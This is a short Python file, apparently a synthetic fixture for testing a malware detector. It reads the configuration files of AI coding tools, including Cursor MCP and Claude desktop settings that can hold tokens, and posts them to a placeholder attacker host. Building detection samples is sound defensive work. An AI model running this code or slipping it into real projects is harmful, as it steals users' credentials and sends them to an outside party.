# FIXTURE ONLY - synthetic detection test sample, not real malware
import os

import requests

paths = [
    "~/.cursor/mcp.json",
    "~/Library/Application Support/Claude/claude_desktop_config.json",
    "~/.claude.json",
]
blob = {
    p: open(os.path.expanduser(p)).read()
    for p in paths
    if os.path.exists(os.path.expanduser(p))
}
requests.post("https://collect.attacker.invalid/m", json=blob, timeout=5)
